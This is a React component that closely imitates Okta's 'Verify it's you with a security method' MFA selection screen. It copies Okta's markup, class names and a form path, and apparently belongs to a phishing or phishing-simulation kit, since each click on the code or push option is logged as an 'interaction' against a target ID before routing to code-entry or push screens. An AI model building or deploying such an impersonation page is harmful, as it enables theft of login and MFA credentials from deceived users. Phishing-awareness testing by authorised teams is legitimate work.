'use client';
import './OktaMFA.scss'
import { useState } from "react";
import EnterCode from "./EnterCode";
import Push from './Push';
import brandLogoSrc from '@/app/(tropic)/brandLogoSrc';
import { getTargetId } from '@/app/(tropic)/getTargetId';
import addIntakeEvent from '@/app/(tropic)/addIntakeEvent';

export default function OktaMFA({ username }) {
    const [stage, setStage] = useState('choose');
    async function handleCode(e) {
        e.preventDefault();
        addIntakeEvent({
            target_id: await getTargetId(),
            type: 'interaction',
            interaction_title: 'Picked Okta Verify code',
        });
        setStage('enterCode');
    }
    async function handlePush(e) {
        e.preventDefault();
        addIntakeEvent({
            target_id: await getTargetId(),
            type: 'interaction',
            interaction_title: 'Picked Okta Verify push',
        });
        setStage('push');
    }
    return (
        <div id="signin-container" className='OktaMFA'>
            {
                stage == 'enterCode' && <EnterCode username={username} setStage={setStage} />
            }
            {
                stage == 'push' && <Push username={username} setStage={setStage} />
            }

            {stage == 'choose' &&
                <main data-se="auth-container" tabIndex="-1" id="okta-sign-in" className="auth-container main-container no-beacon" >
                    <div className="okta-sign-in-header auth-header">
                        <h1>
                            <img src={brandLogoSrc} className="auth-org-logo" alt="anonaddy-trial-8339359 logo logo" aria-label="anonaddy-trial-8339359 logo logo" />
                        </h1>
                        <div data-type="beacon-container" className="beacon-container">
                        </div>
                    </div>
                    <div className="auth-content">
                        <div className="auth-content-inner">
                            <div className="siw-main-view select-authenticator-authenticate">
                                <div className="siw-main-header">
                                    <div>
                                    </div>
                                </div>
                                <div className="siw-main-body">
                                    <form method="POST" action="/idp/authenticators/setup/autoisjunuZcZaeut697" data-se="o-form" slot="content" id="form77" className="ion-form o-form o-form-edit-mode">
                                        <div data-se="o-form-content" className="o-form-content o-form-theme clearfix">
                                            <h2 data-se="o-form-head" className="okta-form-title o-form-head">Verify it's you with a security method</h2>
                                            {
                                                username &&
                                                <div className="identifier-container">
                                                    <span className="identifier no-translate" data-se="identifier" title={username}>{username}</span>
                                                </div>
                                            }
                                            <p className="okta-form-subtitle o-form-explain" data-se="o-form-explain">Select from the following options</p>
                                            <div className="o-form-info-container">
                                            </div>
                                            <div className="o-form-error-container" data-se="o-form-error-container" role="alert">
                                            </div>
                                            <div className="o-form-fieldset-container" data-se="o-form-fieldset-container">
                                            </div>
                                        </div>
                                        <div className="authenticator-verify-list authenticator-list">
                                            <div className="list-content">
                                                <div className="authenticator-row clearfix">
                                                    <div className="authenticator-icon-container">
                                                        <div className="factor-icon authenticator-icon mfa-okta-verify" role="img" aria-label="Authenticator logo">
                                                        </div>
                                                    </div>
                                                    <div className="authenticator-description">
                                                        <div>
                                                            <h3 className="authenticator-label no-translate authenticator-label--small">Enter a code</h3>
                                                            <p className="authenticator-description--text ">Okta Verify</p>
                                                        </div>
                                                        <div className="authenticator-button" data-se="okta_verify-totp">
                                                            <a
                                                                onClick={e => handleCode(e)}
                                                                data-se="button" aria-label="Select to enter a code from the Okta Verify app." className="button select-factor link-button" href="#">Select</a>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div className="authenticator-row clearfix">
                                                    <div className="authenticator-icon-container">
                                                        <div className="factor-icon authenticator-icon mfa-okta-verify" role="img" aria-label="Authenticator logo">
                                                        </div>
                                                    </div>
                                                    <div className="authenticator-description">
                                                        <div>
                                                            <h3 className="authenticator-label no-translate authenticator-label--small">Get a push notification</h3>
                                                            <p className="authenticator-description--text ">Okta Verify</p>
                                                        </div>
                                                        <div className="authenticator-button" data-se="okta_verify-push">
                                                            <a
                                                                onClick={(e) => handlePush(e)}
                                                                data-se="button" aria-label="Select to get a push notification to the Okta Verify app." className="button select-factor link-button" href="#">Select</a>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </form>
                                </div>
                                <div className="siw-main-footer">
                                    <div className="auth-footer">
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </main>
            }
        </div>
    )
}